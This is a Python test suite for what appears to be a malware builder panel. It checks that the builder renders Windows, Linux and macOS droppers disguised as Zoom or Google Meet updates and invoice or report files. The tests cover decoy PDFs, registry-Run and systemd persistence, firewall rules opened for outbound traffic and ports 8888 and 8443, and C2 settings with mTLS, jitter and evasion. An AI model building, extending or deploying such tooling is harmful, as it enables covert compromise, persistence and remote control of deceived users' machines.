import base64
import dataclasses

from panel import build
from panel.build import (
    TARGETS,
    BuildRequest,
    delivery_block,
    load_build_request,
    minimal_pdf,
    render_linux,
    render_windows,
    slug,
    vbs_string_expr,
)
from panel.config import Settings


def test_six_targets():
    assert len(TARGETS) == 6
    assert ("windows", "amd64") in TARGETS
    assert ("linux", "arm64") in TARGETS


def test_vbs_string_expr_continuations():
    expr = vbs_string_expr("abcd" * 2000, width=1024)
    assert expr.startswith('"')
    assert " & _" in expr
    # evaluate the VBS expression mimic: join quoted chunks
    parts = expr.replace(" & _\n    ", "").replace('"', "")
    assert len(parts) == 8000


def test_vbs_string_expr_empty():
    assert vbs_string_expr("") == '""'


def test_minimal_pdf_is_valid_shell():
    pdf = minimal_pdf("Q3 Report (final)")
    assert pdf.startswith(b"%PDF-1.4")
    assert pdf.rstrip().endswith(b"%%EOF")
    assert b"xref" in pdf
    assert b"Q3 Report final" in pdf


def test_render_windows_bakes_all_placeholders():
    out = render_windows(
        "Q3 Report", "abcd", b"\x01\x02\x03", minimal_pdf("x"), "https://get.example"
    )
    assert "{{" not in out
    assert "Q3 Report" in out
    assert "abcd" in out
    assert "ADODB.Stream" in out
    assert "SaveToFile" in out
    assert "WinHttp.WinHttpRequest.5.1" in out
    assert "https://get.example/dl/decoy.pdf" in out
    expected_loader = base64.b64encode(b"\x01\x02\x03").decode()
    assert expected_loader in out.replace('" & _', "").replace("\n", "").replace("    ", "")


def test_render_linux_has_persistence():
    out = render_linux("Q3 Report", "wxyz", b"\xaa\xbb")
    assert "{{" not in out
    assert "loginctl enable-linger" in out
    assert ".config/systemd/user" in out
    assert "setsid" in out
    assert ".fleet-wxyz" in out
    assert base64.b64encode(b"\xaa\xbb").decode() in out


def test_delivery_block_mentions_sha():
    block = delivery_block("linux", "invoice-abcd.tar.gz", "Q3 Report", "deadbeef")
    assert "sha256: deadbeef" in block
    assert "tar xzf" in block


def test_slug_is_eight():
    assert len(slug()) == 8
    assert len({slug() for _ in range(50)}) > 1


def test_profiles_naming():
    assert build.PROFILES["zoom"]["linux"] == "zoom-update"
    assert build.PROFILES["meet"]["linux"] == "google-meet-update"
    req_zoom = BuildRequest(doc_name="d", profile="zoom")
    req_meet = BuildRequest(doc_name="d", profile="meet")
    assert req_zoom.naming["win"].startswith("Zoom")
    assert req_meet.naming["mac"].startswith("Google Meet")


def test_windows_template_persists():
    out = render_windows(
        "Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h", "Zoom Update"
    )
    assert "CurrentVersion\\Run\\Fleetab12" in out
    assert "RegWrite" in out
    assert "ADODB.Stream" in out
    assert "SaveToFile" in out
    assert "Zoom Update" in out


def test_windows_payload_opens_firewall():
    out = render_windows("Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h")
    assert "advfirewall" in out
    assert "dir=out" in out
    assert "action=allow" in out


def test_linux_payload_opens_firewall():
    out = render_linux("zoom-update", "ab12", b"\x01")
    assert "ufw" in out
    assert "firewall-cmd" in out
    assert "8888" in out and "8443" in out


def test_mac_payload_opens_firewall():
    script = (build.TEMPLATES / "mac" / "build_app.sh").read_text(encoding="utf-8")
    assert "socketfilterfw" in script
    assert "--unblockapp" in script


def test_linux_naming_and_delivery():
    name = "zoom-update-ab12.tar.gz"
    block = delivery_block("linux", name, "Zoom Update", "sha")
    assert "./zoom-update-ab12.sh" in block


def test_load_build_request(tmp_settings):
    req = load_build_request(
        {
            "doc_name": "Doc",
            "transport": "mtls",
            "c2_url": "1.2.3.4:8888",
            "base_url": "https://x/",
        },
        tmp_settings,
    )
    assert isinstance(req, BuildRequest)
    assert req.base_url == "https://x"
    assert req.interval == 60 and req.jitter == 35
    assert req.evasion is True


def test_load_build_request_defaults_doc(tmp_settings):
    settings = dataclasses.replace(tmp_settings, document_name="Invoice")
    req = load_build_request({}, settings)
    assert req.doc_name == "Invoice"


def test_settings_has_expected_fields():
    assert issubclass(Settings, object)
